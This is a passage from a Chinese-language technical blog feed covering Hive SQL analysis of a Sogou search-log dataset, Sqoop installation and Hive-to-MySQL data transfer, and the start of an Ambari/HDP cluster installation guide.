class="line">#统计独立uid条数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(uid)) <span class="keyword">from</span> sogou.sogou_ext;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009115150331.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009115150331"></p><h3 id="数据分析需求2关键词分析"><a class="markdownIt-Anchor" href="#数据分析需求2关键词分析">#</a> 数据分析需求（2）：关键词分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查询关键词平均长度</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(a.cnt) <span class="keyword">from</span> (<span class="keyword">select</span> size(split(keyword,<span class="string">&#x27; s+&#x27;</span>)) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext) a;</span><br><span class="line">#由于split函数不支持矢量计算，需要先关闭该功能</span><br><span class="line"><span class="keyword">set</span> hive.vectorized.execution.enabled<span class="operator">=</span><span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009122646106.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009122646106"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询频度排名前<span class="number">50</span></span><br><span class="line"><span class="keyword">select</span> keyword,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> keyword <span class="keyword">order</span> <span class="keyword">by</span> cnt <span class="keyword">desc</span> limit <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009122909785.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009122909785"></p><h3 id="数据分析需求3uid分析"><a class="markdownIt-Anchor" href="#数据分析需求3uid分析">#</a> 数据分析需求（3）：UID 分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#为了统计UID的查询次数分布（查询<span class="number">1</span>次的UID个数…查询n次的UID个数），这里我们列出查询<span class="number">1</span>次、<span class="number">2</span>次、<span class="number">3</span>次和大于<span class="number">3</span>次的UID个数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)),<span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)), <span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>)), <span class="built_in">sum</span>(if(uids.cnt<span class="operator">&gt;</span><span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> uid, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid) uids;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009123459384.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009123459384"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#统计UID平均查询次数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(a.cnt)<span class="operator">/</span><span class="built_in">count</span>(a.uid)<span class="keyword">from</span>(<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid) a;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009124613760.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124613760"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#统计查询次数大于<span class="number">2</span>次的用户占比：</span><br><span class="line">#先统计B:UID总数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(uid)) <span class="keyword">as</span> A <span class="keyword">from</span> sogou.sogou_ext;</span><br><span class="line">#统计查询A:次数大于<span class="number">2</span>的UID个数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(a.uid) <span class="keyword">as</span> B <span class="keyword">from</span> (<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt<span class="operator">&gt;</span><span class="number">2</span>)a;</span><br><span class="line">#占比结果是C<span class="operator">=</span>B<span class="operator">/</span>A</span><br><span class="line">#查询次数大于<span class="number">2</span>次的数据如下</span><br><span class="line"><span class="keyword">select</span> b.<span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt <span class="operator">&gt;</span><span class="number">2</span>) a <span class="keyword">join</span> sogou.sogou_ext b <span class="keyword">on</span> a.uid<span class="operator">=</span>b.uid limit <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009124722432.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124722432"></p><p><img "" class="lazyload placeholder" data-original="image-20211009124814645.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124814645"></p><p><img "" class="lazyload placeholder" data-original="image-20211009125148463.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009125148463"></p><h3 id="数据分析需求4用户行为分析"><a class="markdownIt-Anchor" href="#数据分析需求4用户行为分析">#</a> 数据分析需求（4）：用户行为分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#点击次数与rank之间的关系</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> rank <span class="operator">&lt;</span> <span class="number">11</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4999869</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#直接输入url进行查询的比例</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span><span class="string">&#x27;%www%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">73979</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#用户访问的网站包含用户输入的url类型关键词</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(if(instr(url，keyword)<span class="operator">&gt;</span><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span> <span class="string">&#x27;%www%&#x27;</span>)a;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">27561</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#查询独立用户行为</span><br><span class="line"><span class="keyword">select</span> uid, <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span><span class="string">&#x27;%仙剑奇侠传%&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt <span class="operator">&gt;</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+------+</span></span><br><span class="line"><span class="operator">|</span>                uid                <span class="operator">|</span> cnt  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">265</span>f1fa26029c058c695ecc7ee4bad01  <span class="operator">|</span> <span class="number">4</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>b136abffd8f0dd38d97a52a7e50f7fb  <span class="operator">|</span> <span class="number">4</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">40</span>aa046859609c25b3914ac9f2735c5c  <span class="operator">|</span> <span class="number">5</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">653</span>d48aa356d5111ac0e59f9fe736429  <span class="operator">|</span> <span class="number">9</span>    <span class="operator">|</span></span><br></pre></td></tr></table></figure><h2 id="sqoop-应用与开发"><a class="markdownIt-Anchor" href="#sqoop-应用与开发">#</a> Sqoop 应用与开发</h2><p>在实际开发中我们经常会碰到这样一种需求，即大数据平台处理完的数据需要导入关系型数据库，反之关系型数据库中的数据也需要导入大数据平台，为此大数据平台为我们提供了 Sqoop 工具来解决这一需求。</p><h3 id="sqoop简介"><a class="markdownIt-Anchor" href="#sqoop简介">#</a> Sqoop 简介</h3><p>Sqoop 是 Apache 开源的顶级项目之一，用于在 ApacheHadoop 和关系型数据库等结构化数据存储之间高效传输大容量数据的工具。也就是说，Sqoop 是一款类 ETL 工具，主要负责将大数据平台处理完的数据导入关系型数据库中，或者将关系型数据库中的数据带入大数据平台。</p><h3 id="sqoop安装部署"><a class="markdownIt-Anchor" href="#sqoop安装部署">#</a> Sqoop 安装部署</h3><p>安装环境<br>在安装 Sqoop 之前确保 hadoop 正确启动，运行，mysql 正常运行。<br>解压安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz</span><br><span class="line">mv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">更改目录权限</span></span><br><span class="line">chown hadoop:hadoop -R /usr/local/sqoop/</span><br></pre></td></tr></table></figure><p>配置 Sqoop</p><ol><li>配置 MySQL 连接器<br> Sqoop 底层通过 JDBC 的方式访问 MySQL 数据库，所以需要把 MySQL 数据库的驱动程序复制到 Sqoop 的依赖包，这里可以使用 hive 的 mysql 驱动（如果有）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/hive/lib/mysql-connector-java-5.1.32.jar  /usr/local/sqoop/lib/</span><br></pre></td></tr></table></figure><ol start="2"><li>配置环境变量<br>进入到 Sqoop 的 conf 目录下，找到 sqoop-env-template.sh 文件，<a href="http://xn--sqoop-env-fp6nq62cnhb6779b.sh">重命名为 sqoop-env.sh</a>，打开进行环境变量的配置</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/sqoop/conf/sqoop-env-template.sh  /usr/local/sqoop/conf/sqoop-env.sh</span><br><span class="line">vi /usr/local/sqoop/conf/sqoop-env.sh</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211102175209476.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211102175209476"><br>3. 将 commons-log.jar 包放在 lib 下。<br><a href="https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip">https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv commons-lang-2.6.jar /usr/local/sqoop/lib/</span><br><span class="line">chown hadoop:hadoop /usr/local/sqoop/lib/commons-lang-2.6.jar</span><br></pre></td></tr></table></figure><h3 id="sqoop将hive表中的数据导入mysql"><a class="markdownIt-Anchor" href="#sqoop将hive表中的数据导入mysql">#</a> Sqoop 将 Hive 表中的数据导入 MySQL</h3><p><strong>实验条件</strong><br> MySQL 正常启动<br><strong>构建 MySQL 数据库中的表</strong></p><ol><li>登录 MySQL<br> 登录 MySQL 的命令</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p</span><br></pre></td></tr></table></figure><ol start="2"><li>创建数据库</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> test;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><ol start="3"><li>创建表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>  test.uid_cnt (uid <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="keyword">null</span>,cnt <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">default</span> <span class="keyword">null</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.05</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> test.uid_cnt;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> uid   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">255</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cnt   <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.15</span> sec)</span><br></pre></td></tr></table></figure><p><strong>构建 Hive 数据仓库中的表</strong></p><ol><li>进入 Hive</li><li>创建 Hive 中的表 sogou.sogou_uid_cnt</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sogou.sogou_uid_cnt(uid string,cnt <span class="type">int</span>) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>向表中写入数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> sogou.sogou_uid_cnt <span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou_500w <span class="keyword">group</span> <span class="keyword">by</span> uid;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_uid_cnt limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p><strong>使用 Sqoop 工具将 Hive 的数据导入 MySQL</strong></p><ol><li>导入命令</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>sqoop<span class="operator">/</span>bin<span class="operator">/</span>sqoop export <span class="comment">--connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --export-dir &#x27;hdfs://master:9000/user/hive/warehouse/sogou.db/sogou_uid_cnt&#x27; --fields-terminated-by &#x27;\t&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>以上命令的解释如下<br> sqoop export 表示数据从 Hive 复制到 MySQL 数据库中；–connect jdbc:mysql://master:3306/test 表示连接 MySQL 数据库 test；–username root 表示连接 MySQL 数据库的用户名；–password 12345 表示连接 MySQL 数据库的密码；–table uid_cnt 表示 MySQL 中的表即将被导入的表名称；–export-dir '/user/hive/warehouse/sogou.db/uid_cnt’表示 Hive 中被导出的文件路径；–fields-terminated-by '\t’表示 Hive 中被导出的文件字段的分隔符。</p></li><li><p>以上命令成功运行之后会在控制台打印输出如下结果</p></li><li><p>最后，验证结果数据。<br>登录 MySQL 数据库，查询库 test 的表 uid_cnt 中是已经有了数据，如果有数据说明 Sqoop 工具将 Hive 中的数据成功导入了 MySQL。</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.uid_cnt limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test.uid_cnt;</span><br></pre></td></tr></table></figure><p><strong>使用 Sqoop 工具将 MySQL 中的数据导入 Hive 表</strong><br>前面我们成功地将 Hive 表 sogou_uid_cnt 中的数据导入 MySQL 数据库的 uid_cnt 表，反之，我们再利用 Sqoop 工具将表 uid_cnt 中的数据导入表 sogou_uid_cnt2 中</p><ol><li>首先，在 Hive 中创建表 sogou_uid_cnt2</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sogou.sogou_uid_cnt2(uid string,cnt <span class="type">int</span>) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="keyword">describe</span> sogou.sogou_uid_cnt2;</span><br></pre></td></tr></table></figure><ol start="2"><li>然后，我们就可以使用 Sqoop 工具将 MySQL 中表 uid_cnt 的数据导入 Hive 的表 sogou_uid_cnt<br> 在导入数据之前，/user/hive/warehouse/sogou.db/sogou_uid_cnt2 已经存在，我们将其删除。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -rmdir /user/hive/warehouse/sogou.db/sogou_uid_cnt2</span><br><span class="line"></span><br><span class="line">/usr/local/sqoop/bin/sqoop import --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --target-dir /user/hive/warehouse/sogou.db/sogou_uid_cnt2 --fields-terminated-by &#x27;\t&#x27; -m 1</span><br></pre></td></tr></table></figure><ol start="3"><li>进入 Hive 进行验证</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_uid_cnt2 limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ambari</title>
      <link href="/2021/09/28/%E5%B9%B3%E5%8F%B0/Ambari/"/>
      <url>/2021/09/28/%E5%B9%B3%E5%8F%B0/Ambari/</url>
      
        <content type="html"><![CDATA[<h1 id="ambari"><a class="markdownIt-Anchor" href="#ambari">#</a> Ambari</h1><h2 id="1什么是ambari"><a class="markdownIt-Anchor" href="#1什么是ambari">#</a> 1. 什么是 Ambari</h2><p>Apache Ambari 项目旨在通过开发用于配置，管理和监视 Apache Hadoop 集群的软件来简化 Hadoop 管理。Ambari 通过其 RESTful API 提供了直观，易于使用的 Hadoop 管理 Web UI。</p><p>Ambari 使系统管理员可以：</p><ul><li><p>设置 Hadoop 集群</p><ul><li>Ambari 提供了用于在任意数量的主机上安装 Hadoop 服务的分步向导。</li><li>Ambari 处理群集的 Hadoop 服务的配置。</li></ul></li><li><p>管理 Hadoop 集群</p><ul><li>Ambari 提供了用于在整个集群中启动，停止和重新配置 Hadoop 服务的集中管理。</li></ul></li><li><p>监控 Hadoop 集群</p><ul><li>Ambari 提供了一个仪表板，用于监视 Hadoop 集群的运行状况和状态。</li><li>Ambari 利用<a href="https://issues.apache.org/jira/browse/AMBARI-5707"> Ambari Metrics System</a> 收集指标。</li><li>Ambari 利用<a href="https://issues.apache.org/jira/browse/AMBARI-6354"> Ambari Alert Framework</a> 进行系统警报，并在需要您关注时（例如，节点故障，剩余磁盘空间不足等）通知您。</li></ul></li></ul><p>Ambari 使应用程序开发人员和系统集成商能够：</p><ul><li>使用<a href="https://github.com/apache/blob/trunk/ambari-server/docs/api/v1/index.md"> Ambari REST API</a> 轻松将 Hadoop 的配置，管理和监视功能集成到自己的应用<a href="https://github.com/apache/blob/trunk/ambari-server/docs/api/v1/index.md">程序中</a>。</li></ul><p>官方网站：<a href="http://ambari.apache.org/">http://ambari.apache.org/</a></p><h2 id="2ambari架构"><a class="markdownIt-Anchor" href="#2ambari架构">#</a> 2.Ambari 架构</h2><p><img "" class="lazyload placeholder" data-original="20201010140739738.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><h3 id="ambari-server"><a class="markdownIt-Anchor" href="#ambari-server">#</a> ambari-server</h3><ul><li>提供外部访问的 API</li><li>接受 Ambari-agent 的心跳信息和管理 Ambari-agent</li><li>元数据的管理和数据库的访问</li></ul><h3 id="ambari-agent"><a class="markdownIt-Anchor" href="#ambari-agent">#</a> ambari-agent</h3><ul><li>采集所在节点的信息并且汇总发心跳汇报给 ambari-server</li><li>处理 ambari-server 的执行请求，安装、启动、停止服务等</li></ul><h3 id="ambari-web"><a class="markdownIt-Anchor" href="#ambari-web">#</a> ambari-web</h3><ul><li>提供可视化的操作界面</li></ul><h2 id="3下载"><a class="markdownIt-Anchor" href="#3下载">#</a> 3. 下载</h2><p>Ambari 所在的公司已经被 Cloudera 公司收购所以相关的文档都在 clodera 公司的官方网站：<a href="https://docs.cloudera.com/HDPDocuments/index.html">https://docs.cloudera.com/HDPDocuments/index.html</a></p><p>我们选择的安装方式是：Ambari+HDP+HDP-UTILS, 因为 Ambari 本身只是一个大数据平台自动化部署和管理的工具，所以需要配合 HDP (大数据软件安装包集合) 一起使用。</p><p><img "" class="lazyload placeholder" data-original="image-20211009131251511.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009131251511"></p><p>选择合适的版本，我们这里选择的是 2.7.0.0 版本，然后就会有一个安装指南：<a href="https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html">https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html</a></p><p>其实可以直接配置官网提供的 yum 源就可以安装，但是由于是国外的网站，速度比较慢，所以就使用离线本地 yum 源的安装方式</p><h2 id="4安装环境说明"><a class="markdownIt-Anchor" href="#4安装环境说明">#</a> 4. 安装环境说明</h2><p>使用 VMWare/VirtualBox，虚拟四台虚拟机，(也可以将 server 配置在一台节点中) 其中 ambari 是服务器，其他为 HDP 安装节点，配置如下:</p><table><thead><tr><th style="text-align:center">主机</th><th style="text-align:center">系统</th><th style="text-align:center"><strong>网络</strong></th><th style="text-align:center">内存</th><th>磁盘</th></tr></thead><tbody><tr><td style="text-align:center">ambari</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.160(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-1</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.161(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-2</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.162(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-3</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.163(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr></tbody></table><p>配置好虚拟机就可以安装了，安装的方式如下</p><p><img "" class="lazyload placeholder" data-original="20201010141026410.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h2 id="5server端环境配置ambari"><a class="markdownIt-Anchor" href="#5server端环境配置ambari">#</a> 5.Server 端环境配置 (ambari)</h2><p>说明：如果服务器已经配置好，则直接进行第 6 节客户端的配置。</p><h3 id="51安装http服务"><a class="markdownIt-Anchor" href="#51安装http服务">#</a> 5.1. 安装 http 服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y httpd</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="52配置yum源"><a class="markdownIt-Anchor" href="#52配置yum源">#</a> 5.2. 配置 yum 源</h3><p>虚拟机的网络模式是 nat 或者桥接的时候就可以连通外网，这样我们就可以不用配置 CentOS 的 yum 源了，但是 Ambari 和 HDP 的还需要我们配置，需要将 Ambari 和 HDP 以及 HDP-UTILS 的安装包通过 SFTP 工具上传到 ambari 上。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建文件夹</span></span><br><span class="line">mkdir /var/www/html/&#123;ambari,hdp,hdp-utils&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压安装包到HTTP的网页根目录</span></span><br><span class="line">tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/hdp-utils/</span><br><span class="line">tar -zxvf ambari-2.7.0.0-centos7.tar.gz -C /var/www/html/</span><br><span 